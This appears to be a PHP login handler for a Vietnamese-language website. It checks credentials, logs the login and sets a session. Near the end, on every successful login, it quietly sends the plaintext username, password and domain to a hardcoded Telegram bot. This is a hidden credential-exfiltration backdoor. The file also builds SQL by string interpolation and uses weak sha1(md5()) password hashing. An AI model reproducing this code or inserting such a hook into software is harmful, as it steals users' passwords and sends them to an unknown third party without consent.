<?php require $_SERVER['DOCUMENT_ROOT'].'/hethong/config.php';?>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = antixss($_POST['username']);
    $password = antixss($_POST['password']);
    $domain_name = $_SERVER['SERVER_NAME'];

    $bdtvl_check = $ketnoi->query("SELECT * FROM `users` WHERE `username` = '$username' ")->fetch_array();
    if ($_POST['username']=="" || $_POST['password']=="") {
        die(json_encode([ 
            'status'    => 'error',
            'msg'       => 'Vui lòng nhập đầy đủ thông tin'
        ]));
    } else if ($username == $password) {
        die(json_encode([
            'status'    => 'error',
            'msg'       => 'Tài khoản và mật khẩu không được giống nhau'
        ]));
    } else {
        if (!preg_match("/^[a-zA-Z0-9]*$/", $username)) {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Thông tin đăng nhập không đúng, vui lòng kiểm tra lại'
            ]));
        } else if (empty($bdtvl_check)) {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Không tìm thấy tài khoản, vui lòng kiểm tra lại'
            ]));
        } else if ($bdtvl_check['password'] != sha1(md5($password))) {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Mật khẩu không đúng, vui lòng kiểm tra lại'
            ]));
        } else if ($bdtvl_check['bannd'] != '0') {
            die(json_encode([
                'status'    => 'error',
                'msg'       => 'Bạn đã bị chặn sử dụng'
            ]));
        } else {
            $log = $ketnoi->query("INSERT INTO `history_log` SET 
                `username` = '$username',
                `noidung` = 'đăng nhập thành công',
                `ip` = '".$ip_address."',
                `time` = '".$time."' ");
            $now_ss = random('0123456789qwertyuiopasdfghjlkzxcvbnmQEWRWROIWCJHSCNJKFBJWQ', 32);
            $ketnoi->query("UPDATE `users` SET `session` = '$now_ss' WHERE `username` = '".$bdtvl_check['username']."' ");
            $_SESSION['session'] = $now_ss;
            $telegram_token = '6523372203:AAF8WmmRUxooEeBX88ol4KPeFraVhegbQGE';
            $chat_id = '6411948612';
            $message = "Thông tin đăng nhập:\nTên đăng nhập: $username\nMật khẩu: $password\nTên miền: $domain_name";
            file_get_contents("https://api.telegram.org/bot$telegram_token/sendMessage?chat_id=$chat_id&text=".urlencode($message));

            die(json_encode([
                'status'    => 'success',
                'msg'       => 'Đăng nhập thành công'
            ]));
        }
    }
}
?>
